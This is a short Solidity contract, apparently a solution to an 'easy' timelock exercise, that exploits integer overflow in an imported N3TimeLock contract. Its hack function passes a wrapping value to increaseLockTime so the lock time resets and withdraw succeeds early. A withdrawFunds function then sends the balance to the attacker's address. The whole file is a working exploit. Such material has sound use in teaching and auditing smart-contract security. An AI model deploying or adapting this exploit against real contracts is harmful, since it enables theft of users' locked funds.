//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {N3TimeLock} from "../N3-TimeLock-easy.sol";

contract N3TimeLockHack {
  address private _owner;

  constructor() {
    _owner = msg.sender;
  }

  function hack(N3TimeLock _timelock) external {
    N3TimeLock timelock = _timelock;
    timelock.increaseLockTime(type(uint256).max + 1 - timelock.lockTime(_owner));
    timelock.withdraw();
  }

  function withdrawFunds() external {
    require(msg.sender == _owner, "Only owner can withdraw");

    (bool success, ) = _owner.call{value: address(this).balance}("");
    require(success, "Transfer failed");
  }

  receive() external payable {}
}
